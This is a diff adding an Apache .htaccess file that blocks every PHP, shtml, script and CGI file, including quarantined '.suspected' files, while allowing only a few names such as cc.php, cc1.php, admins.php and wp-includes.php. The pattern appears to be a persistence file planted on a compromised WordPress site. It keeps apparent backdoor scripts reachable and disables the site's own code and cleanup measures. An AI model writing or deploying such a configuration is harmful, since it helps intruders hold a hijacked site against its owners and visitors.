@@ -1,0 +1,9 @@
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*|shtml|shtm*|ShTm*|SHTM*|sHTm*|sh*|cgi|suspected)$">
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(admins.php|index.php|cc.php|cc1.php|wp-config.php|wp-includes.php|index.shtml)$">
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+    Allow from all
+</FilesMatch>
